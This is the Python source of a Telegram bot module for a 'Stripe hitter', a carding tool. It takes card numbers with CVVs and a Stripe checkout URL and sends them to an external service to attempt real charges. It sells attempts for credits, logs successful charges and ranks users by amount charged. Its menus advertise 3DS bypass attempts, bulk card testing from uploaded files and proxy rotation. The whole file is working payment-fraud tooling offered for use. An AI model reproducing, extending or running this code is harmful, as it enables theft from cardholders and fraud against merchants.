# hitter.py

from telebot import types
import requests
import urllib.parse
import json
import time
from hitter_3d import get_user_proxy, get_proxy_url
from hitter_stats import hitter_stats, log_hit, check_can_hit, update_hit_limit
from card_validator import validate_card
#from proxy_manager import get_smart_proxy, proxy_manager
from database import get_user_credits, update_user_credits

API_BASE = "https://stripe-hitter.onrender.com/stripe/checkout-based/url" #fixed from STRNG script.

def mask_card(card: str) -> str:
    try:
        parts = card.split("|")
        if len(parts) < 1:
            return card
        num = parts[0]
        return f"{num[:4]}****{num[-4:]}"
    except Exception:
        return card

def normalize_api_result(raw):
    """
    Normalize any API response into a safe structure.
    Never raises.
    """
    result = {
        "success": False,
        "requires_action": False,
        "message": None,
        "amount": None,
        "merchant": None,
        "attempts": None,
        "error": None,
    }

    if not isinstance(raw, dict):
        result["message"] = str(raw)
        return result

    # Flags
    result["success"] = bool(raw.get("success"))
    result["requires_action"] = bool(
        raw.get("requires_action")
        or raw.get("3ds")
        or raw.get("three_d_secure")
    )

    # Attempts
    if isinstance(raw.get("attempts"), int):
        result["attempts"] = raw["attempts"]

    # Amount
    for key in ("amount", "charged_amount", "total"):
        if raw.get(key):
            result["amount"] = str(raw[key])
            break

    # Merchant
    for key in ("merchant", "site", "store", "domain"):
        if raw.get(key):
            result["merchant"] = str(raw[key])
            break

    # Error / message
    if isinstance(raw.get("error"), dict):
        result["error"] = raw["error"]
        result["message"] = raw["error"].get("message")
    else:
        result["message"] = raw.get("message") or raw.get("status_message")

    if not result["message"]:
        result["message"] = "No detailed response provided by gateway"

    return result

def derive_status(normalized):
    if normalized["success"]:
        return "✅", "APPROVED"
    if normalized["requires_action"]:
        return "🟡", "3DS REQUIRED"
    return "❌", "DECLINED"

def build_dynamic_hud(*, card_masked, normalized, elapsed_ms):
    icon, status = derive_status(normalized)
    lines = []

    def add(line=""):
        lines.append(f"> {line}")

    # Header
    add("╔════════════════════════════╗")
    add("║   ⚙️  <b>STRIPE HITTER HUD</b>   ║")
    add("╚════════════════════════════╝")
    add()

    # Card
    add(f"💳 <b>Card</b>: <code>{card_masked}</code>")

    if normalized.get("attempts") is not None:
        add(f"🧾 <b>Attempts</b>: <b>{normalized['attempts']}</b>")

    add()
    add("━━━━━━━━━━━━━━━━━━━━━━")
    add()
    add(f"{icon} <b>STATUS</b>: <b>{status}</b>")
    add()

    if normalized.get("amount"):
        add(f"💰 <b>Amount</b>: <b>{normalized['amount']}</b>")

    if normalized.get("merchant"):
        add(f"🏪 <b>Merchant</b>: <b>{normalized['merchant']}</b>")

    if normalized["requires_action"]:
        add()
        add("🔐 <b>Authentication Required</b>")
        add("<blockquote>3D Secure verification needed by issuing bank</blockquote>")

    if normalized.get("message"):
        add()
        add("📌 <b>Response</b>:")
        add(f"<blockquote>{normalized['message']}</blockquote>")

    err = normalized.get("error")
    if isinstance(err, dict):
        for k in ("code", "type", "param"):
            if err.get(k):
                add(f"🧠 <b>{k.capitalize()}</b>: <code>{err[k]}</code>")

    add()
    add("━━━━━━━━━━━━━━━━━━━━━━")
    add()
    add(f"⏱️ <b>Time</b>: <code>{elapsed_ms/1000:.2f}s</code>")

    return "\n".join(lines)

def register_hitter_handlers(bot, user_states):

    # ===== URL HANDLER REGISTERED FIRST - Works as text message =====
    def is_url_command(m):
        if not m.text or not m.from_user:
            return False
        text = m.text.strip()
        return text.lower().startswith('/url')
    
    @bot.message_handler(func=is_url_command, content_types=['text'])
    def hitter_url_handler(message):
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        # Check if user is in hitter state waiting for URL
        state = user_states.get(user_id, "")
        
        if not state.startswith("hitter_wait_url::"):
            bot.reply_to(message, "⚠️ Use `/ht CC|MM|YY|CVV` first!", parse_mode="Markdown")
            return
        
        # Extract URL from command
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ Usage: `/url YOUR_CHECKOUT_URL`", parse_mode="Markdown")
            return
        
        checkout_url = parts[1].strip()
        
        # Parse state
        state_parts = state.split("::", 2)
        if len(state_parts) < 3:
            bot.reply_to(message, "⚠️ Session expired. Use /ht to start again.")
            user_states.pop(user_id, None)
            return
        
        card = state_parts[1]
        masked_card = mask_card(card)
        stored_chat_id = int(state_parts[2])
        
        # Validate chat
        if chat_id != stored_chat_id:
            return
        
        # Check rate limit
        can_hit, limit_msg = check_can_hit(user_id, is_premium=False)
        if not can_hit:
            bot.reply_to(message, limit_msg)
            user_states.pop(user_id, None)
            return
        
        # Check credits
        user_credits = get_user_credits(user_id)
        credits_available = user_credits.get('credits', 0)
        credits_cost = hitter_stats.BASIC_HITTER_COST
        
        if not user_credits.get('is_pro') and credits_available < credits_cost:
            bot.reply_to(
                message,
                f"❌ **Insufficient Credits**\n\n"
                f"**Required:** {credits_cost} credits\n"
                f"**You have:** {credits_available} credits\n\n"
                f"Contact admin to purchase credits",
                parse_mode="Markdown"
            )
            user_states.pop(user_id, None)
            return
        
        # Clear state
        user_states.pop(user_id, None)
        
        # Validate URL
        if not checkout_url.startswith("http"):
            bot.reply_to(message, "⚠️ Invalid URL. Must start with http/https")
            return
        
        # Validate card format
        is_valid, val_msg, card_info = validate_card(card)
        if not is_valid:
            bot.reply_to(message, val_msg)
            return
        
        # Check for proxy - use smart selection
 #       user_proxy = get_smart_proxy(user_id)
  #      if not user_proxy:
   #         bot.reply_to(
    #            message,
     #           "❌ **No Proxy**\n\n"
      #          "You must set a proxy first\n"
       #         "**Action:** `/addproxy host:port:user:pass`",
        #        parse_mode="Markdown"
          #  )
         #   return
        
        # Deduct credits
        if not user_credits.get('is_pro'):
            update_user_credits(user_id, -credits_cost)
        
        # Update rate limit
        update_hit_limit(user_id)
        
        # Send processing message
        bot.send_chat_action(chat_id, "typing")
        card_masked = hitter_stats.mask_card(card_info['number'])
        processing_msg = bot.reply_to(
            message, 
            f"⏳ **Processing...**\n\n"
            f"**Card:** `{card_masked}`\n"
            f"**Type:** {card_info.get('type', 'Unknown')}\n"
            f"**Connection:** FASTAF ✅\n"
            f"**Credits:** -{credits_cost}",
            parse_mode="Markdown"
        )
        
        start_time = time.time()
        
        try:
            # URL encode
            encoded_url = urllib.parse.quote(checkout_url, safe='')
            encoded_card = urllib.parse.quote(card, safe='')
            
            # Build API URL
            api_url = f"{API_BASE}/{encoded_url}/pay/cc/{encoded_card}"
            
            # Get proxy URL
           # proxy_url = get_proxy_url(user_proxy)
            ##proxies = {
              #  'http': proxy_url,
               # 'https': proxy_url
            #} if proxy_url else None
            
            # Make request with(out) proxy
            response = requests.get(api_url, timeout=30)
            print(response)
            result = response.json()
            print(result)
            # Calculate response time
            response_time = int((time.time() - start_time) * 1000)
            elapsed_ms = response_time
            # Update proxy health
            #proxy_manager.update_proxy_health(user_proxy, True, response_time)
            
            # Format response
            status = result.get('status', 'unknown')
            message_text = result.get('message', 'No message')
            amount = result.get('amount', '')
            currency = result.get('currency', '')
            gateway = result.get('gateway', 'Basic Hitter API')
            merchant = result.get('merchant', '')
            
            status_emoji = "✅" if status == "success" else "❌"
            success = status == "success"
            
            # Log result
            log_hit(
                user_id=user_id,
                hitter_type='Basic Hitter',
                card=card_info['number'],
                status=status.upper(),
                response=message_text,
                amount=amount,
                currency=currency,
                gateway=gateway,
                merchant=merchant,
                credits_cost=credits_cost
            )
            
            result_text = (
                f"🎯 **Hitter Result**\n\n"
                f"**Card:** `{card_masked}`\n"
                f"**Status:** {status_emoji} {message_text}\n"
            )
            
            if amount:
                result_text += f"**Amount:** {amount} {currency}\n"
            
            if success:
                result_text += f"\n✅ **Success logged to history**\n"
                result_text += f"Use `/history` to view all results"
            
            result_text += f"\n⏱️ **Time:** {response_time}ms"
            
            # Add additional info
            if 'details' in result:
                result_text += f"\n**Details:** {result['details']}"
            
            normalized = normalize_api_result(result)

            hud_text = build_dynamic_hud(
                card_masked=masked_card,
                normalized=normalized,
                elapsed_ms=elapsed_ms
            )

            bot.send_message(
                chat_id,
                hud_text,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            
        except requests.Timeout:
            # Update proxy health as failed
            #proxy_manager.update_proxy_health(user_proxy, False, 30000)
            print("requests Timed Out in hitter.py")
            # Log failed attempt
            log_hit(
                user_id=user_id,
                hitter_type='Basic Hitter',
                card=card_info['number'],
                status='TIMEOUT',
                response='Request timeout',
                credits_cost=credits_cost
            )
            
            bot.edit_message_text(
                "⏳ **Request Timeout**\n\n"
                "API is slow or VPS maybe down\n"
                "Since No Proxies are used in this, so they maybe fine",
                chat_id,
                processing_msg.message_id,
                parse_mode="Markdown"
            )
        except Exception as e:
            print(f"❌ Hitter error: {e}")
            bot.edit_message_text(
                f"❌ Error: {str(e)}",
                chat_id,
                processing_msg.message_id
            )

    # ===== ENTRY (COMMAND) =====
    @bot.message_handler(commands=["ht"])
    def hitter_start(message):
        user_id = message.from_user.id
        chat_id = message.chat.id
        chat_type = message.chat.type
        
        # Check if card was provided with command
        parts = message.text.split(maxsplit=1)
        
        if len(parts) > 1 and parts[1].strip():
            # Card provided with command - validate and ask for URL
            card = parts[1].strip()
            
            if card.count("|") != 3:
                bot.reply_to(message, "⚠️ Invalid card format. Use: `/ht CC|MM|YY|CVV`", parse_mode="Markdown")
                return
            
            # Store state for URL
            user_states[user_id] = f"hitter_wait_url::{card}::{chat_id}"
            
            # Check if user has proxy
            #user_proxy = get_user_proxy(user_id)
            #if not user_proxy:
             #   bot.reply_to(
              #      message,
               #     f"❌ **No Proxy**\n\n"
                #    f"You must set a proxy first\n"
                 #   f"**Action:** `/addproxy host:port:user:pass`\n\n"
                  #  f"**Card:** `{card}`\n"
                   # f"Use `/ht {card}` again after adding proxy",
                    #parse_mode="Markdown"
                #)
                #user_states.pop(user_id, None)
               # return
            
            bot.reply_to(
                message,
                f"✅ **Card Accepted**\n\n"
                f"🌐 Now send the Stripe Checkout URL using:\n"
                f"`/url YOUR_CHECKOUT_URL`",
                parse_mode="Markdown"
            )
        else:
            # No card provided - ask for it
            user_states[user_id] = f"hitter_wait_card::{chat_id}"

            if chat_type in ['group', 'supergroup']:
                # In groups, reply to the message
                #user_proxy = get_user_proxy(user_id)
                #proxy_status = "✅ Ready" if user_proxy else "❌ Missing - use `/addproxy`"
                
                bot.reply_to(
                    message,
                    f"🎯 **Hitter Mode Activated**\n\n"
                    f"**🌐 Connection :** FASTAF 👀\n\n"
                    f"@{message.from_user.username or message.from_user.first_name}, send the card in this format:\n"
                    "`number|mm|yy|cvv`\n\n"
                    "Example: `5312590016282230|12|2027|701`",
                    parse_mode="Markdown"
                )
            else:
                # Private chat
                #user_proxy = get_user_proxy(user_id)
               # proxy_status = "✅ Ready" if user_proxy else "❌ Missing - use `/addproxy`"
                
                bot.send_message(
                    user_id,
                    "🎯 **Hitter Mode**\n\n"
                    f"**🌐 Connection :** FASTAF 👀\n\n"
                    "Send the card in this format:\n"
                    "`number|mm|yy|cvv`",
                    parse_mode="Markdown"
                )

    # ===== ENTRY (INLINE BUTTON) =====
    @bot.callback_query_handler(func=lambda call: call.data == "hitter_menu")
    def hitter_menu_callback(call):
        user_id = call.from_user.id
        chat_id = call.message.chat.id
        
        bot.answer_callback_query(call.id)

        # Show hitter options menu
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("⚡ Basic Hitter (API)", callback_data="basic_hitter"),
            types.InlineKeyboardButton("🎯 3D Hitter (Stripe Direct)", callback_data="3d_hitter_menu")
        )
        markup.add(types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu"))
        
        menu_text = (
            "🎯 **Hitter Menu**\n\n"
            "Choose your hitter type:\n\n"
            "⚡ **Basic Hitter** - Fast API-based checker\n"
            "   • Uses external API\n"
            "   • Quick single card checkout\n"
            "   • Simple URL + Card format\n\n"
            "🎯 **3D Hitter** - Advanced Stripe Direct\n"
            "   • Direct Stripe API integration\n"
            "   • Full 3DS support & bypass\n"
            "   • Proxy support required\n"
            "   • Batch card testing\n"
            "   • Detailed checkout info\n\n"
            "💡 **Commands:**\n"
            "   • `/ht` - Basic hitter\n"
            "   • `/3d` or `/co3d` - 3D hitter\n"
            "   • `/addproxy` - Add proxy for 3D"
        )
        
        bot.edit_message_text(
            menu_text,
            chat_id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )
    
    @bot.callback_query_handler(func=lambda call: call.data == "basic_hitter")
    def basic_hitter_callback(call):
        user_id = call.from_user.id
        chat_id = call.message.chat.id
        chat_type = call.message.chat.type
        
        bot.answer_callback_query(call.id)

        # Store both user_id and chat_id for group support
        user_states[user_id] = f"hitter_wait_card::{chat_id}"

        if chat_type in ['group', 'supergroup']:
            # In groups, edit the message with instructions
            bot.edit_message_text(
                "⚡ **Basic Hitter Mode**\n\n"
                f"@{call.from_user.username or call.from_user.first_name}, send the card in this format:\n"
                "`number|mm|yy|cvv`\n\n"
                "Reply to this message or send in the group.",
                chat_id,
                call.message.message_id,
                parse_mode="Markdown"
            )
        else:
            # Private chat
            bot.edit_message_text(
                "⚡ **Basic Hitter Mode**\n\n"
                "Send the card in this format:\n"
                "`number|mm|yy|cvv`\n\n"
                "Then send the checkout URL using:\n"
                "`/url YOUR_CHECKOUT_URL`",
                chat_id,
                call.message.message_id,
                parse_mode="Markdown"
            )
    
    @bot.callback_query_handler(func=lambda call: call.data == "3d_hitter_menu")
    def hitter_3d_menu_callback(call):
        bot.answer_callback_query(call.id)
        
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("📖 How to Use", callback_data="3d_hitter_help"),
            types.InlineKeyboardButton("🔒 Manage Proxies", callback_data="3d_proxy_menu"),
            types.InlineKeyboardButton("▶️ Start 3D Hitter", callback_data="3d_hitter_start")
        )
        markup.add(types.InlineKeyboardButton("🔙 Back to Hitter Menu", callback_data="hitter_menu"))
        
        menu_text = (
            "🎯 **3D Stripe Hitter**\n\n"
            "⚡ **Direct Stripe API Integration**\n\n"
            "✨ **Features:**\n"
            "   • Parse checkout URLs\n"
            "   • Test single or multiple cards\n"
            "   • 3DS bypass attempts\n"
            "   • File upload support (.txt)\n"
            "   • Real-time progress updates\n\n"
            "⚠️ **Requirements:**\n"
            "   • Working proxy (required)\n"
            "   • Valid Stripe checkout URL\n\n"
            "📝 **Quick Commands:**\n"
            "   `/3d <url>` - Check checkout\n"
            "   `/3d <url> <card>` - Charge card\n"
            "   `/addproxy <proxy>` - Add proxy\n"
            "   `/proxy check` - Check proxies\n\n"
            "👇 Choose an option below"
        )
        
        bot.edit_message_text(
            menu_text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )
    
    @bot.callback_query_handler(func=lambda call: call.data == "3d_hitter_help")
    def hitter_3d_help_callback(call):
        bot.answer_callback_query(call.id)
        
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="3d_hitter_menu"))
        
        help_text = (
            "📖 **3D Hitter Guide**\n\n"
            "**1️⃣ Setup Proxy (Required)**\n"
            "   `/addproxy host:port:user:pass`\n"
            "   Example: `/addproxy 123.45.67.89:8080:myuser:mypass`\n\n"
            "**2️⃣ Check Proxy Status**\n"
            "   `/proxy check`\n\n"
            "**3️⃣ Test Checkout URL**\n"
            "   `/3d https://checkout.stripe.com/c/pay/cs_...`\n"
            "   Returns: Merchant, price, product info\n\n"
            "**4️⃣ Charge Single Card**\n"
            "   `/3d <url> 4111111111111111|12|2027|123`\n\n"
            "**5️⃣ Charge with 3DS Bypass**\n"
            "   `/3d <url> yes 4111111111111111|12|2027|123`\n\n"
            "**6️⃣ Bulk Testing (File)**\n"
            "   1. Upload .txt file with cards\n"
            "   2. Reply: `/3d <url>`\n\n"
            "💡 **Card Format:**\n"
            "   `number|month|year|cvv`\n\n"
            "🔒 **Proxy Formats:**\n"
            "   • `host:port:user:pass`\n"
            "   • `user:pass@host:port`\n"
            "   • `host:port` (no auth)\n\n"
            "📊 **Response Codes:**\n"
            "   • ✅ CHARGED - Success\n"
            "   • ❌ DECLINED - Card declined\n"
            "   • 🔐 3DS - 3DS required\n"
            "   • 🔓 3DS SKIP - Can't bypass\n"
            "   • ⚠️ ERROR - Connection issue"
        )
        
        bot.edit_message_text(
            help_text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )
    
    @bot.callback_query_handler(func=lambda call: call.data == "3d_proxy_menu")
    def hitter_3d_proxy_menu_callback(call):
        bot.answer_callback_query(call.id)
        
        user_id = call.from_user.id
        
        # Get user's proxies
        from hitter_3d import get_user_proxies
        user_proxies = get_user_proxies(user_id)
        
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="3d_hitter_menu"))
        
        proxy_text = (
            "🔒 **Proxy Manager**\n\n"
            f"**Your Proxies:** {len(user_proxies)}\n\n"
        )
        
        if user_proxies:
            proxy_text += "**Proxy List:**\n"
            for i, proxy in enumerate(user_proxies[:5], 1):
                proxy_text += f"   {i}. `{proxy}`\n"
            if len(user_proxies) > 5:
                proxy_text += f"   ... and {len(user_proxies) - 5} more\n"
        else:
            proxy_text += "⚠️ **No proxies added**\n"
        
        proxy_text += (
            "\n**Commands:**\n"
            "   `/addproxy <proxy>` - Add proxy\n"
            "   `/proxy check` - Check all\n"
            "   `/removeproxy <proxy>` - Remove\n"
            "   `/removeproxy all` - Remove all\n\n"
            "**Formats:**\n"
            "   • `host:port:user:pass`\n"
            "   • `user:pass@host:port`\n"
            "   • `host:port`"
        )
        
        bot.edit_message_text(
            proxy_text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )
    
    @bot.callback_query_handler(func=lambda call: call.data == "3d_hitter_start")
    def hitter_3d_start_callback(call):
        bot.answer_callback_query(call.id)
        
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="3d_hitter_menu"))
        
        start_text = (
            "▶️ **Start 3D Hitter**\n\n"
            "**Quick Start:**\n\n"
            "1️⃣ **Check Checkout Info**\n"
            "   `/3d <stripe_checkout_url>`\n\n"
            "2️⃣ **Charge Single Card**\n"
            "   `/3d <url> <card>`\n\n"
            "3️⃣ **With 3DS Bypass**\n"
            "   `/3d <url> yes <card>`\n\n"
            "**Example:**\n"
            "```\n"
            "/3d https://checkout.stripe.com/c/pay/cs_test_abc123 4111111111111111|12|2027|123\n"
            "```\n\n"
            "**Card Format:**\n"
            "   `number|mm|yy|cvv`\n\n"
            "⚠️ Make sure you have a proxy configured!\n"
            "   Use `/addproxy` if not set up yet."
        )
        
        bot.edit_message_text(
            start_text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )

    # ===== COMBINED HANDLER FOR CARD AND URL =====
    def is_hitter_state(m):
        print(f"🔍 FILTER CALLED | From: {m.from_user.id if m.from_user else 'unknown'} | Text: {m.text[:50] if m.text else 'NO TEXT'}")
        print(f"📊 Current user_states: {user_states}")
        
        if not m.text or not m.from_user:
            print(f"❌ Rejected: No text or no user")
            return False
        user_id = m.from_user.id
        state = str(user_states.get(user_id, ""))
        is_hitter = state.startswith("hitter_wait_")
        print(f"🔍 User {user_id} | State: '{state}' | Match: {is_hitter}")
        return is_hitter
    
    @bot.message_handler(func=is_hitter_state, content_types=['text'])
    def hitter_handle_input(message):
        user_id = message.from_user.id
        chat_id = message.chat.id
        text = message.text.strip()
        state = user_states.get(user_id, "")
        
        print(f"✅ HITTER HANDLER TRIGGERED | User: {user_id} | State: {state}")
        
        # Check if waiting for card
        if state.startswith("hitter_wait_card::"):
            print(f"📝 Processing card input")
            card = text
            masked_card = mask_card(card)            
            # Allow cancellation
            if card.lower() in ['/cancel', '/start']:
                user_states.pop(user_id, None)
                bot.reply_to(message, "🔄 Hitter cancelled. Use /start to begin again.")
                return

            # Get stored chat_id from state
            stored_chat_id = int(state.split("::", 1)[1]) if "::" in state else user_id
            
            # Only process if message is in the same chat
            if chat_id != stored_chat_id:
                print(f"⚠️ Chat mismatch: {chat_id} != {stored_chat_id}")
                return

            if card.count("|") != 3:
                bot.reply_to(message, "⚠️ Invalid card format. Try again or use /cancel to exit.")
                return

            user_states[user_id] = f"hitter_wait_url::{card}::{chat_id}"
            print(f"✅ Card accepted, waiting for URL from user {user_id}")

            bot.reply_to(
                message,
                "🌐 Now send the **Stripe Checkout URL** using:\n"
                "`/url YOUR_CHECKOUT_URL`",
                parse_mode="Markdown"
            )

    # ===== NEW HITTER STATISTICS COMMANDS =====
    
    @bot.message_handler(commands=['history', 'hitterhistory'])
    def history_command(message):
        """Show hitter history"""
        user_id = message.from_user.id
        limit = 10
        
        # Check if user wants more results
        parts = message.text.split()
        if len(parts) > 1 and parts[1].isdigit():
            limit = min(int(parts[1]), 50)
        
        history = hitter_stats.get_user_history(user_id, limit=limit)
        
        if not history:
            bot.reply_to(
                message,
                "📭 **No History Found**\n\n"
                "You haven't used the hitter yet.\n"
                "Use `/ht` or `/3d` to get started!",
                parse_mode="Markdown"
            )
            return
        
        response = f"📊 **Hitter History** (Last {len(history)})\n\n"
        
        for i, item in enumerate(history, 1):
            emoji = "✅" if item['success'] else "❌"
            response += f"{i}. {emoji} **{item['hitter_type']}**\n"
            response += f"   Card: `{item['card']}`\n"
            response += f"   Status: {item['status']}\n"
            if item['amount']:
                response += f"   Amount: {item['amount']} {item['currency']}\n"
            response += f"   Time: {item['timestamp']}\n\n"
        
        response += f"💡 Use `/export` to save complete history\n"
        response += f"💡 Use `/successes` for successful hits only"
        
        bot.reply_to(message, response, parse_mode="Markdown")
    
    @bot.message_handler(commands=['successes', 'wins'])
    def successes_command(message):
        """Show only successful hits"""
        user_id = message.from_user.id
        
        history = hitter_stats.get_user_history(user_id, limit=20, success_only=True)
        
        if not history:
            bot.reply_to(
                message,
                "📭 **No Successful Hits Yet**\n\n"
                "Keep trying! Your successful charges will appear here.",
                parse_mode="Markdown"
            )
            return
        
        response = f"✅ **Successful Hits** ({len(history)} found)\n\n"
        
        for i, item in enumerate(history, 1):
            response += f"{i}. **{item['hitter_type']}**\n"
            response += f"   Card: `{item['card']}`\n"
            response += f"   Status: {item['status']}\n"
            if item['amount']:
                response += f"   💰 Amount: **{item['amount']} {item['currency']}**\n"
            if item['gateway']:
                response += f"   Gateway: {item['gateway']}\n"
            response += f"   📅 {item['timestamp']}\n\n"
        
        response += f"\n🎯 Success Rate: Check `/hiterstats`"
        
        bot.reply_to(message, response, parse_mode="Markdown")
    
    @bot.message_handler(commands=['export', 'exporthistory'])
    def export_command(message):
        """Export history to file"""
        user_id = message.from_user.id
        
        # Check if user wants success only
        args = message.text.split()
        success_only = 'success' in message.text.lower() or 'wins' in message.text.lower()
        
        bot.send_chat_action(message.chat.id, "upload_document")
        
        export_text = hitter_stats.export_history_txt(user_id, success_only=success_only)
        
        if export_text == "No history found.":
            bot.reply_to(
                message,
                "📭 **No History to Export**\n\n"
                "Use the hitter first to generate history.",
                parse_mode="Markdown"
            )
            return
        
        # Create file
        from io import BytesIO
        file_data = BytesIO(export_text.encode('utf-8'))
        file_data.name = f"hitter_history_{'successes' if success_only else 'all'}_{user_id}.txt"
        
        bot.send_document(
            message.chat.id,
            file_data,
            caption=f"📄 **History Export**\n\n"
                   f"{'✅ Successful hits only' if success_only else '📊 Complete history'}\n"
                   f"Use `/history` to view in chat",
            parse_mode="Markdown"
        )
    
    @bot.message_handler(commands=['hitterstats', 'mystats'])
    def hitter_stats_command(message):
        """Show comprehensive hitter statistics"""
        user_id = message.from_user.id
        
        stats = hitter_stats.get_user_stats(user_id)
        
        if stats['total_hits'] == 0:
            bot.reply_to(
                message,
                "📊 **No Statistics Yet**\n\n"
                "Start using `/ht` or `/3d` to build your stats!",
                parse_mode="Markdown"
            )
            return
        
        response = "📊 **Your Hitter Statistics**\n\n"
        response += f"**Total Attempts:** {stats['total_hits']}\n"
        response += f"**Successful:** {stats['total_successes']} ✅\n"
        response += f"**Failed:** {stats['total_fails']} ❌\n"
        response += f"**Success Rate:** {stats['success_rate']:.1f}%\n\n"
        
        response += f"💰 **Total Charged:** ${stats['total_charged']:.2f}\n"
        response += f"💳 **Credits Spent:** {stats['credits_spent']}\n\n"
        
        response += f"📅 **Today:**\n"
        response += f"   Hits: {stats['daily_hits']}\n"
        response += f"   Successes: {stats['daily_successes']}\n\n"
        
        if stats.get('favorite_gateway'):
            response += f"⭐ **Favorite Gateway:** {stats['favorite_gateway']}\n"
        
        if stats.get('best_bin'):
            response += f"🎯 **Best BIN:** {stats['best_bin']}\n"
        
        if stats.get('last_success'):
            response += f"\n🕒 **Last Success:** {stats['last_success']}\n"
        
        response += f"\n💡 **Commands:**\n"
        response += f"• `/history` - View attempts\n"
        response += f"• `/successes` - Successful hits\n"
        response += f"• `/export` - Download history\n"
        response += f"• `/leaderboard` - Top users"
        
        bot.reply_to(message, response, parse_mode="Markdown")
    
    @bot.message_handler(commands=['leaderboard', 'top', 'topusers'])
    def leaderboard_command(message):
        """Show top users leaderboard"""
        # Get metric from command
        metric = 'successes'  # default
        if 'rate' in message.text.lower():
            metric = 'rate'
        elif 'hits' in message.text.lower():
            metric = 'hits'
        elif 'charged' in message.text.lower():
            metric = 'charged'
        
        leaderboard = hitter_stats.get_leaderboard(limit=10, metric=metric)
        
        if not leaderboard:
            bot.reply_to(
                message,
                "📭 **Leaderboard Empty**\n\n"
                "Be the first to use the hitter!",
                parse_mode="Markdown"
            )
            return
        
        metric_names = {
            'successes': 'Successful Hits',
            'rate': 'Success Rate',
            'hits': 'Total Hits',
            'charged': 'Total Charged'
        }
        
        response = f"🏆 **Leaderboard - {metric_names[metric]}**\n\n"
        
        medals = ["🥇", "🥈", "🥉"]
        
        for entry in leaderboard:
            rank = entry['rank']
            medal = medals[rank-1] if rank <= 3 else f"{rank}."
            
            response += f"{medal} User {entry['user_id']}\n"
            
            if metric == 'successes':
                response += f"   ✅ {entry['total_successes']} successes\n"
            elif metric == 'rate':
                response += f"   📈 {entry['success_rate']:.1f}% success rate\n"
            elif metric == 'hits':
                response += f"   🎯 {entry['total_hits']} total hits\n"
            elif metric == 'charged':
                response += f"   💰 ${entry['total_charged']:.2f} charged\n"
            
            response += f"   ({entry['total_hits']} hits, {entry['success_rate']:.1f}% rate)\n\n"
        
        response += f"\n💡 **View Other Metrics:**\n"
        response += f"• `/leaderboard rate` - By success rate\n"
        response += f"• `/leaderboard hits` - By total hits\n"
        response += f"• `/leaderboard charged` - By amount charged"
        
        bot.reply_to(message, response, parse_mode="Markdown")
    
    @bot.message_handler(commands=['proxyrotate', 'smartproxy'])
    def proxy_rotation_command(message):
        """Toggle smart proxy rotation"""
        user_id = message.from_user.id
        
        from proxy_manager import enable_proxy_rotation, is_rotation_enabled
        
        # Toggle rotation
        current = is_rotation_enabled(user_id)
        enable_proxy_rotation(user_id, not current)
        new_state = not current
        
        response = "🔄 **Smart Proxy Rotation**\n\n"
        
        if new_state:
            response += "✅ **ENABLED**\n\n"
            response += "Benefits:\n"
            response += "• Auto-selects fastest proxy\n"
            response += "• Skips dead proxies\n"
            response += "• Load balancing\n"
            response += "• Better success rates\n"
        else:
            response += "❌ **DISABLED**\n\n"
            response += "Random proxy selection\n"
        
        response += f"\nUse `/proxyrotate` to toggle"
        
        bot.reply_to(message, response, parse_mode="Markdown")


